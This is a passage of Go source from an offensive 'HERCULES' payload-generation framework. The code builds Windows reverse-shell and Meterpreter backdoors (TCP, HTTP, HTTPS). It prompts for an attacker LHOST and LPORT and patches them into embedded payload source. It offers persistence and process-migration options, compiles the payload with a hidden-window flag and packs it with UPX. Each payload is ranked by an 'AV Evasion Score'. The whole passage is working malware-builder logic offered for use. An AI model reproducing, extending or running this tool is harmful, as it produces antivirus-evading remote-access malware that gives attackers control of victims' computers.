  color.Red(" ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░")
  color.Red(" ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░  ░  ▒   ░░▒░ ░ ░ ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░")
  color.Red(" ░  ░░ ░   ░     ░░   ░ ░         ░░░ ░ ░   ░ ░      ░   ░  ░  ░  ")
  color.Red(" ░  ░  ░   ░  ░   ░     ░ ░         ░         ░  ░   ░  ░      ░  ")
  color.Red("                        ░                                         ")

}

func PrintCredit()  {
  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  color.Green("\n+ -- --=[        HERCULES  FRAMEWORK        ]")
  color.Green("+ -- --=[         Version: "+VERSION+"            ]")
  BoldGreen.Println("+ -- --=[            Ege Balcı              ]")
}


func Menu_1()  {
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  White := color.New(color.FgWhite)
  UnderlinedWhite := White.Add(color.Underline)
  BoldYellow.Println("\n[1] GENERATE PAYLOAD ")
  BoldYellow.Println("\n[2] BIND PAYLOAD ")
  BoldYellow.Println("\n[3] UPDATE ")

  UnderlinedWhite.Print("\n\n[*] Select : ")
}

func PrintPayloads()  {

  White := color.New(color.FgWhite)
  BoldWhite := White.Add(color.Bold)
  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)


  fmt.Println("\n")
  BoldWhite.Println(" #===============================================================================#")
  BoldWhite.Println(" |     PAYLOAD                           |     SIZE/UPX     |  AV Evasion Score  |")
  BoldWhite.Println(" |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~|")
  BoldWhite.Print("(1) Meterpreter Reverse TCP              |  946 KB / 262 KB |       ")
  BoldGreen.Print("10/10        ")
  BoldWhite.Println("|")
  BoldWhite.Println(" |                                       |                  |                    |")
  BoldWhite.Print("(2) Meterpreter Reverse HTTP             |  4.2 MB / 1.1 MB |       ")
  BoldGreen.Print("10/10        ")
  BoldWhite.Println("|")
  BoldWhite.Println(" |                                       |                  |                    |")
  BoldWhite.Print("(3) Meterpreter Reverse HTTPS            |  4.2 MB / 1.1 MB |       ")
  BoldGreen.Print("10/10        ")
  BoldWhite.Println("|")
  BoldWhite.Println(" |                                       |                  |                    |")
  BoldWhite.Print("(4) HERCULES REVERSE SHELL               |  4.4 MB / 1.1 MB |        ")
  BoldGreen.Print("9/10        ")
  BoldWhite.Println("|")
  BoldWhite.Println(" |                                       |                  |                    |")
  BoldWhite.Println(" #===============================================================================#")
  fmt.Println("\n")
}


func FinalView()  {
  Cyan := color.New(color.FgCyan)
  BoldCyan := Cyan.Add(color.Bold)
  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  Blue := color.New(color.FgBlue)
  BoldBlue := Blue.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  Red := color.New(color.FgRed)
  BoldRed := Red.Add(color.Bold)
  White := color.New(color.FgWhite)
  BoldWhite := White.Add(color.Bold)
  ClearScreen()
  PrintBanner()

  if Payload.Type == 1 {
    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse TCP                    | 946 KB / 262 KB  |        ")
    if Payload.Score < 5 {
      BoldRed.Print(Payload.Score)
    }else if Payload.Score == 5 {
      BoldYellow.Print(Payload.Score)
    }else {
      BoldGreen.Print(Payload.Score)
    }
    if Payload.Score == 10 {
      BoldGreen.Print("/10       ")
    }else{
      BoldGreen.Print("/10        ")
    }
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")
  }else if Payload.Type == 2 {
    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse HTTP                   | 4.2 MB / 1.1 MB  |        ")
    if Payload.Score < 5 {
      BoldRed.Print(Payload.Score)
    }else if Payload.Score == 5 {
      BoldYellow.Print(Payload.Score)
    }else {
      BoldGreen.Print(Payload.Score)
    }
    if Payload.Score == 10 {
      BoldGreen.Print("/10       ")
    }else{
      BoldGreen.Print("/10        ")
    }
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")
  }else if Payload.Type == 3 {
    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse HTTPS                  | 4.2 MB / 1.1 MB  |        ")
    if Payload.Score < 5 {
      BoldRed.Print(Payload.Score)
    }else if Payload.Score == 5 {
      BoldYellow.Print(Payload.Score)
    }else {
      BoldGreen.Print(Payload.Score)
    }
    if Payload.Score == 10 {
      BoldGreen.Print("/10       ")
    }else{
      BoldGreen.Print("/10        ")
    }
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")
  }else if Payload.Type == 4 {
    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# HERCULES REVERSE SHELL                     | 4.4 MB / 1.1 MB  |        ")
    if Payload.Score < 5 {
      BoldRed.Print(Payload.Score)
    }else if Payload.Score == 5 {
      BoldYellow.Print(Payload.Score)
    }else {
      BoldGreen.Print(Payload.Score)
    }
    if Payload.Score == 10 {
      BoldGreen.Print("/10       ")
    }else{
      BoldGreen.Print("/10        ")
    }
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")
  }


  if Payload.Persistence == true {
    BoldCyan.Print("\n[*] Persistence : ON")
    BoldWhite.Print(" (")
    BoldRed.Print("-2")
    BoldWhite.Println(")")
  }
  if Payload.Migrate == true {
    BoldCyan.Print("\n[*] Migration : ON")
    BoldWhite.Print(" (")
    BoldRed.Print("-1")
    BoldWhite.Println(")")
  }

  if Payload.UPX == true {
    BoldCyan.Print("\n[*] UPX : ON")
    BoldWhite.Print(" (")
    BoldRed.Print("-3")
    BoldWhite.Println(")")
  }


  if Payload.Type == 1 {
    if Payload.UPX == true && (Payload.Persistence || Payload.Migrate ){
      BoldCyan.Println("\n[*] Payload Size : 326 KB")
    }else if Payload.UPX == true && !(Payload.Persistence || Payload.Migrate) {
      BoldCyan.Println("\n[*] Payload Size : 262 KB")
    }else if Payload.UPX == false && !(Payload.Persistence || Payload.Migrate ) {
      BoldCyan.Println("\n[*] Payload Size : 946 KB")
    }

  }else{
    if Payload.UPX == true {
      BoldCyan.Println("\n[*] Payload Size : " + Payload.UPX_Size)
    }else{
      BoldCyan.Println("\n[*] Payload Size : " + Payload.Size)
    }
  }


  PayloadName := strings.TrimSuffix(Payload.FileName, ".go")

  PayloadName += ".exe"

  BoldWhite.Println("\n[*] Payload saved at : /$HOME/" + PayloadName + "\n\n")


}


func CompilePayload()  {
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)

  Payload.FileName += ".go"

  File, _ := os.Create(Payload.FileName)
  Source, _ := base64.StdEncoding.DecodeString(Payload.SourceCode)
  var SourceCode string

  if Payload.Type == 2 || Payload.Type == 3 {
    Address := string("\"http://" + Payload.Ip + ":" + Payload.Port + "/\"")
    SourceCode = strings.Replace(string(Source), string("\"http://127.0.0.1:8080/\""), string(Address), -1)
    if Payload.Persistence == true {
      SourceCode = strings.Replace(string(SourceCode), "//import \"EGESPLOIT/RSE\"", `import "EGESPLOIT/RSE"`, -1)
      SourceCode = strings.Replace(string(SourceCode), "//RSE.Persistence()", "RSE.Persistence()", -1)
    }
    if Payload.Migrate == true {
      SourceCode = strings.Replace(string(SourceCode), "//import \"EGESPLOIT/RSE\"", "import \"EGESPLOIT/RSE\"", -1)
      SourceCode = strings.Replace(string(SourceCode), "//RSE.Migrate(Addr, len(Shellcode))", "RSE.Migrate(Addr, len(Shellcode))", -1)
    }


    File.WriteString(SourceCode)

    BuildCommand_Args := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
    BoldYellow.Println("\n[*] Compiling payload...")
    BoldYellow.Println("\n[*] " + BuildCommand_Args)
    BuildCommand := exec.Command("sh", "-c", BuildCommand_Args)
    BuildCommand.Stdout = os.Stdout
    BuildCommand.Stderr = os.Stderr
    BuildCommand.Run()
    CleanFilesCommand := string("rm " + Payload.FileName)
    exec.Command("sh", "-c", CleanFilesCommand).Run()
    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
      Warning.Println("\n[!] ERROR : Compile failed")
      os.Exit(1)
    }
    File.Close()
    MovePayload := string("mv " + FileName_No_Suffix + ".exe $HOME")
    exec.Command("sh", "-c", MovePayload).Run()




  }else if Payload.Type == 1 {
    var IP string = "[4]byte{"
    IP_Array := strings.Split(string(Payload.Ip), `.`)
    for i := 0; i < 4; i++ {
      if i == 3 {
        IP += (IP_Array[i] + ",")
        break
      }
      IP += (IP_Array[i] + "," + " ")
    }
    IP += "}}"

    SourceCode = strings.Replace(string(Source), `[4]byte{127,0,0,1}}`, IP, -1)
    SourceCode = strings.Replace(string(SourceCode), `5555`, Payload.Port, -1)

    if Payload.Persistence == true {
      SourceCode = strings.Replace(string(SourceCode), `//import "EGESPLOIT/RSE"`, `import "EGESPLOIT/RSE"`, -1)
      SourceCode = strings.Replace(string(SourceCode), `//RSE.Persistence()`, `RSE.Persistence()`, -1)
    }
    if Payload.Migrate == true {
      SourceCode = strings.Replace(string(SourceCode), `//import "EGESPLOIT/RSE"`, `import "EGESPLOIT/RSE"`, -1)
      SourceCode = strings.Replace(string(SourceCode), `//RSE.Migrate(Addr, int(Length_int))`, `RSE.Migrate(Addr, int(Length_int))`, -1)
    }


    File.WriteString(SourceCode)

    BuildCommand_Args := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
    BoldYellow.Println("\n[*] Compiling payload...")
    BoldYellow.Println("\n[*] " + BuildCommand_Args)
    BuildCommand := exec.Command("sh", "-c", BuildCommand_Args)
    BuildCommand.Stdout = os.Stdout
    BuildCommand.Stderr = os.Stderr
    BuildCommand.Run()
    CleanFilesCommand := string("rm " + Payload.FileName)
    exec.Command("sh", "-c", CleanFilesCommand).Run()
    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
      Warning.Println("\n[!] ERROR : Compile failed")
      os.Exit(1)
    }
    File.Close()
    MovePayload := string("mv " + FileName_No_Suffix + ".exe $HOME")
    exec.Command("sh", "-c", MovePayload).Run()

  }else if Payload.Type == 4 {
    Payload.Ip = string(`"`+Payload.Ip+`"`)
    Payload.Port = string(`"`+Payload.Port+`"`)
    SourceCode = strings.Replace(string(Source), `"10.10.10.84"`, Payload.Ip, -1)
    SourceCode = strings.Replace(string(SourceCode), `"5555"`, Payload.Port, -1)

    File.WriteString(SourceCode)

    BuildCommand_Args := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
    BoldYellow.Println("\n[*] Compiling payload...")
    BoldYellow.Println("\n[*] " + BuildCommand_Args)
    BuildCommand := exec.Command("sh", "-c", BuildCommand_Args)
    BuildCommand.Stdout = os.Stdout
    BuildCommand.Stderr = os.Stderr
    BuildCommand.Run()
    CleanFilesCommand := string("rm " + Payload.FileName)
    exec.Command("sh", "-c", CleanFilesCommand).Run()
    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
      Warning.Println("\n[!] ERROR : Compile failed")
      os.Exit(1)
    }
    File.Close()
    MovePayload := string("mv " + FileName_No_Suffix + ".exe $HOME")
    exec.Command("sh", "-c", MovePayload).Run()

  }

}

func AskMigrate()  {
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)
  fmt.Print("\n[?] Do you want to add migration function to payload (y/n) :")
  fmt.Scan(&Ask)
  if Ask == "y" || Ask == "Y" {
    Warning.Print("\n[!] Adding migration will decreases the AV Evasion Score and increase the paylaod size, do you still want to continue (Y/n) :")
    fmt.Scan(&Ask)
    if Ask == "y" || Ask == "Y"{
      Payload.Migrate = true
      Payload.Score = (Payload.Score - 1)
    }else{
        Payload.Migrate = false
    }
  }else{
      Payload.Migrate = false
  }
}




func AskPersistence()  {
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)
  fmt.Print("\n[?] Do you want to add persistence function to payload (y/n) :")
  fmt.Scan(&Ask)
  if Ask == "y" || Ask == "Y" {
    Warning.Print("\n[!] Adding persistence will decreases the AV Evasion Score and increase the paylaod size, do you still want to continue (Y/n) :")
    fmt.Scan(&Ask)
    if Ask == "y" || Ask == "Y"{
      Payload.Persistence = true
      Payload.Score = (Payload.Score - 2)
    }else{
        Payload.Persistence = false
    }
  }else{
      Payload.Persistence = false
  }
}


func AskUPX()  {
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)
  fmt.Print("\n[?] Do you want to compress the payload with UPX (y/n) :")
  fmt.Scan(&Ask)
  if Ask == "y" || Ask == "Y" {
    Warning.Print("\n[!] Compressing payloads with UPX decreases the AV Evasion Score, do you still want to continue (Y/n) :")
    fmt.Scan(&Ask)
    if Ask == "y" || Ask == "Y"{
      Payload.UPX = true
      Payload.Score = (Payload.Score - 3)
      ClearScreen()
      PrintBanner()

      ExeName := strings.TrimSuffix(Payload.FileName, ".go")
      ExeName += ".exe"
      UPX_Command := string("upx --brute " + ExeName)
      UPX := exec.Command("sh", "-c", UPX_Command)
      UPX.Stdout = os.Stdout
      UPX.Run()
    }else{
        Payload.UPX = false
    }
  }else{
      Payload.UPX = false
  }
}


func ClearScreen()  {
  Clear := exec.Command("clear")
  Clear.Stdout = os.Stdout
  Clear.Run()
}







func PreparePayload(No int)  {

  Blue := color.New(color.FgBlue)
  BoldBlue := Blue.Add(color.Bold)
  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)


  if No == 1 {
    Payload.Type = 1
    Payload.Size = "946 KB"
    Payload.FullSize = "1.1 MB"
    Payload.MidSize = "326 KB"
    Payload.UPX_Size = "262 KB"
    Payload.Score = 10
    Payload.SourceCode = METERPRETER_TCP

    ClearScreen()
    PrintBanner()

    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse TCP                    | 946 KB / 262 KB  |       ")
    BoldGreen.Print("10/10        ")
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")

    for  ;;  {
      var IP string
      fmt.Print("\n\n[*] Enter LHOST : ")
      fmt.Scan(&IP)
      if (len(IP) < 7) || (len(IP) > 15) {
        Warning.Println("\n\n[!] ERROR : Invalid ip")
      }else{
        Payload.Ip = IP
        break
      }

    }

    for  ;;  {
      var PORT string
      fmt.Print("\n[*] Enter LPORT : ")
      fmt.Scan(&PORT)
      _, err := strconv.Atoi(PORT)
      if err == nil {
        Payload.Port = PORT
        break
      }
      Warning.Println("\n\n[!] ERROR : Invalid port")

    }
      AskPersistence()
      AskMigrate()


  }else if No == 2 {

    Payload.Type = 2
    Payload.Size = "4.2 MB"
    Payload.UPX_Size = "1.1 KB"
    Payload.Score = 10
    Payload.SourceCode = METERPRETER_HTTP_HTTPS

    ClearScreen()
    PrintBanner()

    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse HTTP                   | 4.2 MB / 1.1 MB  |       ")
    BoldGreen.Print("10/10        ")
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")

    for  ;;  {
      var IP string
      fmt.Print("\n\n[*] Enter LHOST : ")
      fmt.Scan(&IP)
      if (len(IP) < 7) || (len(IP) > 15) {
        Warning.Println("\n\n[!] ERROR : Invalid ip")
      }else{
        Payload.Ip = IP
        break
      }

    }

    for  ;;  {
      var PORT string
      fmt.Print("\n[*] Enter LPORT : ")
      fmt.Scan(&PORT)
      _, err := strconv.Atoi(PORT)
      if err == nil {
        Payload.Port = PORT
        break
      }
      Warning.Println("\n\n[!] ERROR : Invalid port")

    }


    AskPersistence()
    AskMigrate()


   }else if No == 3 {
    Payload.Type = 3
    Payload.Size = "4.2 MB"
    Payload.Score = 10
    Payload.SourceCode = METERPRETER_HTTP_HTTPS

    ClearScreen()
    PrintBanner()

    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse HTTPS                  | 4.2 MB / 1.1 MB  |       ")
    BoldGreen.Print("10/10        ")
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")

    for  ;;  {
      var IP string
      fmt.Print("\n\n[*] Enter LHOST : ")
      fmt.Scan(&IP)
      if (len(IP) < 7) || (len(IP) > 15) {
        Warning.Println("\n\n[!] ERROR : Invalid ip")
      }else{
        Payload.Ip = IP
        break
      }

    }

    for  ;;  {
      var PORT string
      fmt.Print("\n[*] Enter LPORT : ")
      fmt.Scan(&PORT)
      _, err := strconv.Atoi(PORT)
      if err == nil {
        Payload.Port = PORT
        break
      }
      Warning.Println("\n\n[!] ERROR : Invalid port")

    }

    AskPersistence()
    AskMigrate()



  }else if No == 4 {
    Payload.Type = 4
    Payload.Size = "4.4 MB"
    Payload.Score = 9
    Payload.SourceCode = HERCULES_REVERSE_SHELL

    ClearScreen()
    PrintBanner()

    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# HERCULES REVERSE SHELL                     | 4.4 MB / 1.1 MB  |        ")
    BoldGreen.Print("9/10        ")
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")

    for  ;;  {
      var IP string
      fmt.Print("\n\n[*] Enter LHOST : ")
      fmt.Scan(&IP)
      if (len(IP) < 7) || (len(IP) > 15) {
        Warning.Println("\n\n[!] ERROR : Invalid ip")
      }else{
        Payload.Ip = IP
        break
      }

    }

    for  ;;  {
      var PORT string
      fmt.Print("\n[*] Enter LPORT : ")
      fmt.Scan(&PORT)
      _, err := strconv.Atoi(PORT)
      if err == nil {
        Payload.Port = PORT
        break
      }
      Warning.Println("\n\n[!] ERROR : Invalid port")

    }



  }else {

    ClearScreen()
    PrintBanner()
    PrintPayloads()

    Warning.Println("\n[!] ERROR : Invalid choise\n")

    fmt.Print("\n\n[*] Select : ")
    fmt.Scan(&NO)

    PreparePayload(NO)

  }

}
